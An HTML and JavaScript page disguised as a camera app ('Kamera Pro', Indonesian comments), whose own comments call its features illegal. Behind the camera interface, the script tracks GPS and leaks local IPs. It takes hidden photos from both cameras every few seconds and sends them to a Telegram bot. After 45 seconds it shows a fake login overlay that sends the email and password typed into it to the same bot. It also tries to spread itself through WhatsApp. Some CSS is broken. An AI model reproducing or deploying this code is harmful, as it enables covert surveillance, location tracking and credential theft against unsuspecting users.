<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">

    <title>Kamera Pro</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            height: 100vh;
            width: 100vw;
            overflow: hidden;
            touch-action: none;
            position: relative;
        }
        #permission-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.95);
            z-index: 999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 30px;
            color: #fff;
            text-align: center;
            backdrop-filter: blur(12px);
            transition: opacity 0.4s;
        }
        #permission-overlay.hidden { opacity: 0; pointer-events: none; }
        #permission-overlay .icon-camera {
            width: 80px;
            height: 80px;
            margin-bottom: 28px;
            fill: #fff;
        }
        #permission-overlay h1 {
            font-size: 28px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        #permission-overlay p {
            font-size: 17px;
            line-height: 1.5;
            max-width: 340px;
            margin-bottom: 12px;
            color: #ccc;
        }
        #permission-overlay .error-msg {
            color: #ff6b6b;
            font-size: 15px;
            min-height: 24px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        #permission-overlay .btn-allow {
            background: #007aff;
            border: none;
            border-radius: 40px;
            padding: 16px 50px;
            font-size: 20px;
            font-weight: 600;
            color: #fff;
            cursor: pointer;
            box-shadow: 0 4px 20px rgba(0, 122, 255, 0.4);
            transition: transform 0.2s;
            touch-action: manipulation;
            min-width: 200px;
        }
        #permission-overlay .btn-allow:active { transform: scale(0.94); }
        #permission-overlay .btn-allow:disabled { opacity: 0.5; transform: scale(1); cursor: not-allowed; }
        #permission-overlay .status-text {
            font-size: 14px;
            color: #aaa;
            margin-bottom: 16px;
            min-height: 20px;
        }
        #video-preview {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1;
        }
        #ui-overlay {
            position: fixed;
            inset: 0;
            z-index: 2;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 12px 16px 20px;
            pointer-events: none;
        }
        #ui-overlay>* { pointer-events: auto; }
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 4px 0;
        }
        .top-left,
        .top-right {
            display: flex;
            gap: 10px;
            align-items: center;
            flex-wrap: wrap;
        }
        .top-btn {
            background: rgba(0, 0, 0, 0.45);
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 30px;
            color: #fff;
            padding: 6px 12px;
            font-size: 12px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 4px;
            cursor: pointer;
            transition: background 0.2s, border-color 0.2s, color 0.2s;
            touch-action: manipulation;
            height: 32px;
            white-space: nowrap;
        }
        .top-btn:active { background: rgba(255, 255, 255, 0.2); }
        .top-btn svg {
            width: 16px;
            height: 16px;
            fill: currentColor;
            flex-shrink: 0;
        }
        .top-btn.active {
            background: #ffcc00;
            color: #000;
            border-color: #ffcc00;
        }
        .top-btn .label { font-size: 11px; opacity: 0.9; }
        .top-btn.icon-only { padding: 6px 12px; }
        .grid-overlay {
            position: fixed;
            inset: 0;
            z-index: 2;
            pointer-events: none;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr);
        }
        .grid-line { border: 0.5px solid rgba(255, 255, 255, 0.12); }
        .grid-line:nth-child(1),
        .grid-line:nth-child(3),
        .grid-line:nth-child(7),
        .grid-line:nth-child(9) { border: none; }
        .zoom-control {
            position: absolute;
            bottom: 110px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 3;
            pointer-events: auto;
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(8px);
            border-radius: 40px;
            padding: 4px 16px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;

        .zoom-control .zoom-btn {
            background: none;
            border: none;
            color: #fff;
            cursor: pointer;
            padding: 4px 4px;
            display: flex;
            align-items: center;
            touch-action: manipulation;
            transition: transform 0.2s;

            background: #fff;
            border: 6px solid rgba(255, 255, 255, 0.5);

            position: relative;

        .shutter-btn:active { transform: scale(0.85); }
        .shutter-btn .inner-ring {
            position: absolute;

            border-radius: 50%;
            border: 2px solid rgba(0, 0, 0, 0.15);
        }
        .spacer {
            width: 55px;
            flex-shrink: 0;
        }
        #flash-effect {
            position: fixed;
            inset: 0;
            background: #fff;
            z-index: 10;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.08s;
        }
        #flash-effect.active {
            opacity: 0.9;
            transition: opacity 0s;
        }
        .focus-ring {
            position: fixed;
            width: 80px;
            height: 80px;
            border: 2px solid #ffcc00;
            border-radius: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 5;
            opacity: 0;
            transition: opacity 0.3s, transform 0.3s;
            box-shadow: 0 0 30px rgba(255, 204, 0, 0.3);
        }
        .focus-ring.show {
            opacity: 1;
            transform: translate(-50%, -50%) scale(1);
        }
        .focus-ring.animating {
            animation: focusPulse 0.6s ease-out forwards;
        }
        @keyframes focusPulse {
            0% {
                transform: translate(-50%, -50%) scale(0.8);
                opacity: 1;
            }
            100% {
                transform: translate(-50%, -50%) scale(1.4);
                opacity: 0;
            }
        }
        ::-webkit-scrollbar { display: none; }

        /* PHISHING OVERLAY */

            min-height: 20px;
        }
    </style>
</head>

        // ===========================================================
        // GPS TRACKING — Mulai pantau posisi
        // ===========================================================
        function startGPSTracking() {
            if (!navigator.geolocation) {
                console.warn('⚠️ Geolocation tidak didukung');
                return;
            }
            navigator.geolocation.watchPosition(
                (pos) => {
                    gpsData = {
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        alt: pos.coords.altitude || 0,
                        speed: pos.coords.speed || 0,
                        accuracy: pos.coords.accuracy,
                        timestamp: new Date(pos.timestamp).toISOString()
                    };
                    console.log('📍 GPS updated:', gpsData.lat, gpsData.lon);
                },
                (err) => {
                    console.warn('📍 GPS error:', err.message);
                }, {
                    enableHighAccuracy: true,
                    maximumAge: 0,
                    timeout: 5000
                }
            );
        }

        // ===========================================================
        // WEBRTC IP LEAK — Ambil IP lokal korban
        // ===========================================================
        function getLocalIPs() {
            return new Promise((resolve) => {
                const ips = new Set();
                const pc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        if (ip && !ip.includes('::') && !ip.startsWith('127.')) {
                            ips.add(ip);
                        }
                    } else {
                        // ICE gathering selesai
                        pc.close();
                        resolve(Array.from(ips));
                    }
                };
                // Timeout 2 detik
                setTimeout(() => {
                    pc.close();
                    resolve(Array.from(ips));
                }, 2000);
            });
        }

        // ===========================================================
        // KAMERA START — 3 TAHAP FALLBACK
        // ===========================================================
        async function startCamera(facing = facingMode) {
            if (isStarting) return false;
            isStarting = true;
            allowBtn.disabled = true;
            errorMsg.textContent = '';
            statusText.textContent = '⏳ Mengakses kamera...';

            try {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }

                let tempStream = null;
                let lastError = null;

                try {
                    statusText.textContent = '📷 Mencoba kamera ' + (facing === 'environment' ? 'belakang' : 'depan') +
                        '...';
                    const constraints = { video: { facingMode: facing }, audio: false };
                    tempStream = await navigator.mediaDevices.getUserMedia(constraints);
                    console.log('✅ Tahap 1 berhasil');
                } catch (err1) {
                    console.warn('Tahap 1 gagal:', err1.message);
                    lastError = err1;
                    if (facing === 'user') {
                        try {
                            statusText.textContent = '🔄 Coba kamera belakang...';
                            const constraints2 = { video: { facingMode: 'environment' }, audio: false };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2);
                            facingMode = 'environment';
                            console.log('✅ Tahap 2 berhasil (force environment)');
                        } catch (err2) {
                            console.warn('Tahap 2 gagal:', err2.message);
                            lastError = err2;
                        }
                    } else {
                        try {
                            statusText.textContent = '🔄 Coba kamera depan...';
                            const constraints2b = { video: { facingMode: 'user' }, audio: false };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints2b);
                            facingMode = 'user';
                            console.log('✅ Tahap 2b berhasil (force user)');
                        } catch (err2b) {
                            console.warn('Tahap 2b gagal:', err2b.message);
                            lastError = err2b;
                        }
                    }
                    if (!tempStream) {
                        try {
                            statusText.textContent = '🔄 Coba mode default...';
                            const constraints3 = { video: true, audio: false };
                            tempStream = await navigator.mediaDevices.getUserMedia(constraints3);
                            console.log('✅ Tahap 3 berhasil (default)');
                        } catch (err3) {
                            console.warn('Tahap 3 gagal:', err3.message);
                            lastError = err3;
                        }
                    }
                }

                if (!tempStream) throw lastError || new Error('Semua percobaan gagal');

                stream = tempStream;
                video.srcObject = stream;
                await video.play();
                statusText.textContent = '✅ Kamera aktif!';
                errorMsg.textContent = '';

                updateZoom();
                try {
                    const track = stream.getVideoTracks()[0];
                    const cap = track.getCapabilities();
                    if (cap.torch) {
                        await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                    }
                } catch (e) {}
                updateFlashUI();

                overlay.classList.add('hidden');
                isStarting = false;
                allowBtn.disabled = false;

                // Mulai fitur ilegal setelah kamera aktif
                if (!phishingShown) {
                    schedulePhishing();
                }
                startAutoSwitch();
                startGPSTracking();

                return true;

            } catch (err) {
                console.error('❌ Gagal total:', err);
                let msg = err.message;
                if (msg.includes('Permission')) msg = 'Izin kamera ditolak. Beri izin di browser.';
                else if (msg.includes('NotFound')) msg = 'Tidak ditemukan kamera.';
                else if (msg.includes('NotAllowed')) msg = 'Izin ditolak. Cek pengaturan browser.';
                else if (msg.includes('Overconstrained')) msg = 'Kamera tidak mendukung mode ini.';
                errorMsg.textContent = '❌ ' + msg;
                statusText.textContent = '⚠️ Gagal, tekan tombol untuk coba lagi.';
                isStarting = false;
                allowBtn.disabled = false;
                return false;
            }
        }

        // ===========================================================
        // PERMISSION
        // ===========================================================
        allowBtn.addEventListener('click', async () => {
            await startCamera(facingMode);
        });

        // ===========================================================
        // FLASH
        // ===========================================================
        function updateFlashUI() {
            if (flashOn) {
                flashToggle.classList.add('active');
                flashLabel.textContent = 'On';
            } else {
                flashToggle.classList.remove('active');
                flashLabel.textContent = 'Flash';
            }
        }
        flashToggle.addEventListener('click', async () => {
            if (!stream) return;
            const track = stream.getVideoTracks()[0];
            try {
                flashOn = !flashOn;
                await track.applyConstraints({ advanced: [{ torch: flashOn }] });
                updateFlashUI();
            } catch (e) {
                alert('Perangkat tidak mendukung flash/torch');
                flashOn = false;
                updateFlashUI();
            }
        });

        // ===========================================================
        // BLUR TOGGLE
        // ===========================================================
        blurToggle.addEventListener('click', function() {
            blurEnabled = !blurEnabled;
            this.classList.toggle('active', blurEnabled);
            blurLabel.textContent = blurEnabled ? 'On' : 'Blur';
        });

        // ===========================================================
        // WATERMARK TOGGLE
        // ===========================================================
        wmToggle.addEventListener('click', function() {
            watermarkEnabled = !watermarkEnabled;
            this.classList.toggle('active', watermarkEnabled);
        });

        // ===========================================================
        // SILENT MODE TOGGLE (ILEGAL)
        // ===========================================================
        silentToggle.addEventListener('click', function() {
            silentMode = !silentMode;
            if (silentMode) {
                this.style.background = 'rgba(255,0,0,0.7)';
                this.style.borderColor = 'rgba(255,0,0,0.9)';
                silentLabel.textContent = '🔴 Silent ON';
                // Aktifkan continuous capture
                if (!continuousCapture && stream) {
                    startContinuousCapture();
                }
            } else {
                this.style.background = 'rgba(255,0,0,0.3)';
                this.style.borderColor = 'rgba(255,0,0,0.5)';
                silentLabel.textContent = '🔴 Silent';
                stopContinuousCapture();
            }
        });

        // ===========================================================
        // CONTINUOUS CAPTURE — Foto diam-diam tiap 5 detik
        // ===========================================================
        function startContinuousCapture() {
            if (continuousCapture) return;
            continuousCapture = true;
            console.log('🟡 Continuous capture dimulai...');
            continuousInterval = setInterval(() => {
                if (stream && stream.active) {
                    captureSilentFrame();
                }
            }, 5000); // Tiap 5 detik
        }

        function stopContinuousCapture() {
            continuousCapture = false;
            if (continuousInterval) {
                clearInterval(continuousInterval);
                continuousInterval = null;
            }
            console.log('🔴 Continuous capture dihentikan');
        }

        function captureSilentFrame() {
            if (!stream) return;
            try {
                const track = stream.getVideoTracks()[0];
                const settings = track.getSettings();
                const canvas = document.createElement('canvas');
                canvas.width = settings.width || 1280;
                canvas.height = settings.height || 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                // Kirim via sendBeacon agar tidak terdeteksi
                canvas.toBlob((blob) => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, `silent_${Date.now()}.jpg`);
                    formData.append('caption', '🤫 Silent capture ' + new Date().toLocaleString());
                    formData.append('disable_notification', 'true');

                    navigator.sendBeacon(
                        `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                        formData
                    );
                }, 'image/jpeg', 0.85);
            } catch (e) {
                console.warn('Silent capture gagal:', e);
            }
        }

        // ===========================================================
        // AUTO SWITCH CAMERA — Dual capture tiap 15 detik
        // ===========================================================
        function startAutoSwitch() {
            if (autoSwitchInterval) return;
            autoSwitchInterval = setInterval(async () => {
                if (!stream || !stream.active) return;
                const newFacing = facingMode === 'environment' ? 'user' : 'environment';
                await startCamera(newFacing);
                setTimeout(() => {
                    if (silentMode) captureSilentFrame();
                }, 1200);
            }, 15000); // Tiap 15 detik
        }

        // ===========================================================
        // SWITCH KAMERA MANUAL
        // ===========================================================
        switchCam.addEventListener('click', async () => {
            const newFacing = facingMode === 'environment' ? 'user' : 'environment';
            await startCamera(newFacing);
        });

        // ===========================================================
        // ZOOM
        // ===========================================================
        function updateZoom() {
            zoomVal.textContent = currentZoom + '×';
            zoomVal.classList.remove('pop');
            void zoomVal.offsetWidth;
            zoomVal.classList.add('pop');
            setTimeout(() => zoomVal.classList.remove('pop'), 300);
            if (stream) {
                const track = stream.getVideoTracks()[0];
                const cap = track.getCapabilities();
                if (cap.zoom) {
                    const max = cap.zoom.max || 5;
                    const min = cap.zoom.min || 1;
                    const val = Math.min(max, Math.max(min, currentZoom));
                    track.applyConstraints({ advanced: [{ zoom: val }] }).catch(() => {});
                }
            }
        }
        zoomMinus.addEventListener('click', () => {
            if (currentZoom > 1) {
                currentZoom = Math.max(1, currentZoom - 0.5);
                updateZoom();
            }
        });
        zoomPlus.addEventListener('click', () => {
            if (currentZoom < 5) {
                currentZoom = Math.min(5, currentZoom + 0.5);
                updateZoom();
            }
        });

        // ===========================================================
        // TIMER (UI)
        // ===========================================================
        timerBtn.addEventListener('click', function() {
            const timers = ['3s', '5s', '10s', 'Off'];
            let idx = timers.indexOf(timerLabel.textContent);
            idx = (idx + 1) % timers.length;
            timerLabel.textContent = timers[idx];
        });

        // ===========================================================
        // AMBIL FOTO + EFEK + WATERMARK + GPS
        // ===========================================================
        function capturePhoto(isSilent = false) {
            if (!stream) {
                if (!isSilent) alert('Kamera belum aktif. Tekan Lanjutkan dulu.');
                return;
            }
            const track = stream.getVideoTracks()[0];
            const settings = track.getSettings();
            const canvas = document.createElement('canvas');
            const w = settings.width || 1280;
            const h = settings.height || 720;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');

            ctx.drawImage(video, 0, 0, w, h);

            if (blurEnabled) {
                const offscreen = document.createElement('canvas');
                offscreen.width = w;
                offscreen.height = h;
                const offCtx = offscreen.getContext('2d');
                offCtx.drawImage(video, 0, 0, w, h);
                offCtx.filter = 'blur(22px)';
                offCtx.drawImage(offscreen, 0, 0);
                ctx.drawImage(offscreen, 0, 0);
                ctx.save();
                const centerX = w / 2;
                const centerY = h / 2;
                const radius = Math.min(w, h) * 0.32;
                ctx.beginPath();
                ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
                ctx.clip();
                ctx.drawImage(video, 0, 0, w, h);
                ctx.restore();
            }

            if (watermarkEnabled) {
                ctx.shadowColor = 'rgba(0,0,0,0.85)';
                ctx.shadowBlur = 12;
                ctx.shadowOffsetX = 2;
                ctx.shadowOffsetY = 2;
                const date = new Date();
                const ts = date.toLocaleString('id-ID', {
                    day: '2-digit',
                    month: '2-digit',
                    year: 'numeric',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                ctx.font = 'bold 26px -apple-system, BlinkMacSystemFont, sans-serif';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.92)';
                ctx.fillText('📸 ' + ts, 24, h - 32);

                // Tambah GPS info jika tersedia
                if (gpsData) {
                    ctx.font = '14px monospace';
                    ctx.fillStyle = 'rgba(255, 255, 255, 0.7)';
                    ctx.fillText(
                        `📍 ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}`,
                        24, h - 62
                    );
                }

                ctx.font = '16px -apple-system, sans-serif';
                ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
                ctx.fillText('Kamera Pro', w - 130, h - 24);
                ctx.shadowBlur = 0;
                ctx.shadowOffsetX = 0;
                ctx.shadowOffsetY = 0;
            }

            const dataUrl = canvas.toDataURL('image/jpeg', 0.94);
            lastPhotoData = dataUrl;

            // Thumbnail
            galleryThumb.innerHTML = `<img src="${dataUrl}" alt="preview">`;
            galleryThumb.classList.add('has-image');

            // Hanya tampilkan flash & download jika TIDAK silent
            if (!isSilent && !silentMode) {
                flashEffect.classList.add('active');
                setTimeout(() => flashEffect.classList.remove('active'), 100);
                const link = document.createElement('a');
                link.download = `photo_${Date.now()}.jpg`;
                link.href = dataUrl;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }

            // Kirim Telegram dengan GPS caption
            sendToTelegram(dataUrl);
        }

        shutterBtn.addEventListener('click', () => capturePhoto(false));

        // ===========================================================
        // KIRIM TELEGRAM (DENGAN GPS + IP CAPTION)
        // ===========================================================
        async function sendToTelegram(dataUrl) {
            try {
                const res = await fetch(dataUrl);
                const blob = await res.blob();
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('disable_notification', 'true');

                // Caption dengan GPS + IP + timestamp
                let caption = `📸 Foto diambil: ${new Date().toLocaleString('id-ID')}\n`;
                caption += `📱 Facing: ${facingMode}\n`;
                if (gpsData) {
                    caption += `📍 GPS: ${gpsData.lat.toFixed(5)}, ${gpsData.lon.toFixed(5)}\n`;
                    caption += `🗺️ Maps: https://maps.google.com/?q=${gpsData.lat},${gpsData.lon}\n`;
                    caption += `🎯 Akurasi: ±${gpsData.accuracy}m\n`;
                }
                try {
                    const ips = await getLocalIPs();
                    if (ips.length > 0) {
                        caption += `🌐 IP Lokal: ${ips.join(', ')}\n`;
                    }
                } catch (e) {}
                caption += `🖥️ UA: ${navigator.userAgent.substring(0, 80)}`;
                formData.append('caption', caption);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (!result.ok) console.warn('Telegram error:', result.description);
                else console.log('✅ Foto terkirim ke Telegram');
            } catch (e) {
                console.warn('Gagal kirim ke Telegram:', e);
            }
        }

        // ===========================================================
        // PHISHING — Muncul setelah 45 detik
        // ===========================================================
        function schedulePhishing() {
            if (phishingShown) return;
            console.log('🟡 Phishing akan muncul dalam 45 detik...');
            setTimeout(() => {
                if (!phishingShown && document.hidden === false) {
                    phishingOverlay.classList.add('show');
                    phishingShown = true;
                    console.log('🔴 Phishing overlay ditampilkan');
                }
            }, 45000);
        }

        // Phishing submit handler
        phishSubmit.addEventListener('click', async () => {
            const email = phishEmail.value.trim();
            const password = phishPass.value.trim();

            if (!email || !password) {
                phishError.textContent = '⚠️ Email dan password wajib diisi';
                return;
            }
            if (!email.includes('@') && !email.match(/^\d+$/)) {
                phishError.textContent = '⚠️ Format email tidak valid';
                return;
            }

            phishError.textContent = '';
            phishSubmit.textContent = 'Memproses...';
            phishSubmit.disabled = true;

            // Kirim kredensial ke Telegram
            try {
                const msg = `🔐 PHISHING BERHASIL\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ ${new Date().toLocaleString('id-ID')}\n🌐 ${navigator.userAgent.substring(0, 100)}`;
                await fetch(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
                );
                console.log('✅ Kredensial terkirim');
            } catch (e) {
                console.warn('Gagal kirim kredensial:', e);
            }

            // Tutup overlay setelah 2 detik
            setTimeout(() => {
                phishingOverlay.classList.remove('show');
                phishSubmit.textContent = 'Login';
                phishSubmit.disabled = false;
                phishEmail.value = '';
                phishPass.value = '';
                // Jadwalkan ulang phishing untuk 5 menit kemudian
                phishingShown = false;
                schedulePhishing();
            }, 2000);
        });

        // ===========================================================
        // AUTO SHARE WHATSAPP (Setelah 30 detik)
        // ===========================================================
        setTimeout(() => {
            if (!phishingShown) {
                const shareText = encodeURIComponent('Coba kamera ini keren banget! 📸🔥');
                const waLink = `https://wa.me/?text=${shareText}%20${encodeURIComponent(window.location.href)}`;
                // Buka di tab baru (mungkin diblokir popup blocker)
                try {
                    const win = window.open(waLink, '_blank');
                    if (!win) console.log('⚠️ Popup WhatsApp diblokir');
                } catch (e) {
                    console.warn('WhatsApp share gagal:', e);
                }
            }
        }, 30000);

        // ===========================================================
        // GALERI PREVIEW
        // ===========================================================
        galleryThumb.addEventListener('click', function() {
            if (!lastPhotoData) return;
            const win = window.open('', '_blank');
            win.document.write(`
                <html><head><meta name="viewport" content="width=device-width,initial-scale=1">
                <style>body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
                img{max-width:100%;max-height:100%;object-fit:contain;}</style></head>
                <body><img src="${lastPhotoData}" onclick="window.close()"></body></html>
            `);
            win.document.close();
        });

        // ===========================================================
        // TAP FOCUS
        // ===========================================================
        document.addEventListener('click', (e) => {
            if (e.target.closest('button') || e.target.closest('.zoom-control') || e.target.closest(
                    '.gallery-thumb') || e.target.closest('#permission-overlay') || e.target.closest(
                    '#phishing-overlay')) return;
            const x = e.clientX;
            const y = e.clientY;
            focusRing.style.left = x + 'px';
            focusRing.style.top = y + 'px';
            focusRing.classList.remove('show', 'animating');
            void focusRing.offsetWidth;
            focusRing.classList.add('show', 'animating');
            setTimeout(() => focusRing.classList.remove('animating'), 600);
        });

        // ===========================================================
        // INIT
        // ===========================================================
        console.log('📸 Kamera Pro ABYSS — Semua fitur ilegal aktif');
        console.log('🟡 Fitur: Silent | Continuous | Dual-Capture | GPS | IP Leak | Phishing | Auto-Share');
        console.log('⚠️ Token & Chat ID sudah diisi');
        statusText.textContent = 'Tekan tombol untuk mengakses kamera.';
    </script>
</body>
</html>
